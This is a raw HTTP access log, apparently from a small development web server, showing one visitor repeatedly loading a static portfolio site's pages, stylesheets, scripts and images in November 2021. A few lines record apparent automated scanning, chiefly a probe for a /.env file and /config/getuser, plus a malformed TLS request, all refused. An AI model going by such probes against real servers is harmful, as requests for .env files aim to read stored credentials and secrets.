223.237.233.161 - - [08/Nov/2021 05:22:59] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:22:59] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:22:59] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:22:59] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:00] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:01] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:01] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:02] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:02] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:02] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:23:03] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:08] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:08] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:08] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:09] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:10] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:10] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:10] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:10] "GET /js/jquery.nav.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:10] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:10] "GET /js/waypoints.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/3.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/1.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/2.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/5.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /js/custom.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/logo.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:11] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:12] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:12] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:12] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:12] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:14] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:14] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:15] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:16] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:16] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:16] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:17] "GET /images/links-arrow.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:24:20] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
223.237.233.161 - - [08/Nov/2021 05:29:12] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 05:29:12] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:12] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:13] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:14] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/banner-bg2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/work/1.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/work/2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/work/3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/work/4.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:15] "[36mGET /images/work/5.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:16] "[36mGET /images/work/6.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:16] "[36mGET /images/work/7.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:16] "[36mGET /images/work/8.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 05:29:16] "[36mGET /images/links-arrow.png HTTP/1.1[0m" 304 -
209.141.62.185 - - [08/Nov/2021 05:52:27] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
209.141.56.209 - - [08/Nov/2021 06:00:12] "GET / HTTP/1.1" 200 -
64.62.197.62 - - [08/Nov/2021 06:02:21] "GET / HTTP/1.1" 200 -
209.17.96.210 - - [08/Nov/2021 06:14:12] code 400, message Bad request version ('À(À$À\x14À')
209.17.96.210 - - [08/Nov/2021 06:14:12] "[35m[1m ä  àQ	²¶Ãx¼Ï±·ÃëË8 }ì×QoqÙæ¿0  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
159.203.18.202 - - [08/Nov/2021 06:16:35] "[33mGET /.env HTTP/1.1[0m" 404 -
159.203.18.202 - - [08/Nov/2021 06:16:35] "[31m[1mPOST / HTTP/1.1[0m" 405 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:10] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:11] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:11] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:11] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:11] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:11] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:12] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:12] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:12] "GET /images/3.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:12] "GET /images/1.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:12] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /images/5.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /images/2.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /images/logo.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /js/jquery.nav.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /js/waypoints.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /js/custom.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:13] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:14] "GET /images/links-arrow.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:14] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:14] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:14] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:27] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:30] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:30] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:30] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:30] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:30] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:30] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:31] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:32] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:33] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:33] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:33] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:34] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:34] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:34] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:34] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:34] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:34] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:35] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:36] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:36] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:36] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:36] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:36] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:36] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "[36mGET /images/work/3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:37] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:38] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:39] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:39] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:14:39] "[36mGET /images/links-arrow.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:39] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 08:14:51] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
223.237.233.161 - - [08/Nov/2021 08:15:24] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:24] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /css/isotope.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /css/animate.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /css/styles.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:25] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:26] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:26] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:26] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:26] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:26] "GET /images/3.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:26] "GET /images/about-img.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:27] "GET /images/5.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:27] "GET /images/logo.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:27] "GET /images/2.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:27] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:27] "GET /images/1.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:27] "GET /js/jquery.nav.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:28] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:28] "GET /js/waypoints.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:28] "GET /js/custom.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:28] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:28] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:28] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:29] "GET /images/work/1.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:29] "GET /images/work/2.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:31] "GET /images/work/3.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:32] "GET /images/work/4.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:33] "GET /images/work/5.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:34] "GET /images/work/6.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:34] "GET /images/work/7.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:34] "GET /images/work/8.jpg HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:36] "GET /images/links-arrow.png HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 08:15:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
148.64.27.61 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /css/isotope.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /css/animate.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /css/styles.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:37] "GET / HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:37] "GET /css/isotope.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:37] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:37] "GET /css/animate.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:37] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
209.120.227.2 - - [08/Nov/2021 08:24:38] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /css/styles.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/jquery.nav.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/waypoints.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/custom.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/5.png HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/about-img.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/1.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/2.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/4.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/3.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/5.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/logo.png HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/6.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/7.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/work/8.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/links-arrow.png HTTP/1.1" 200 -
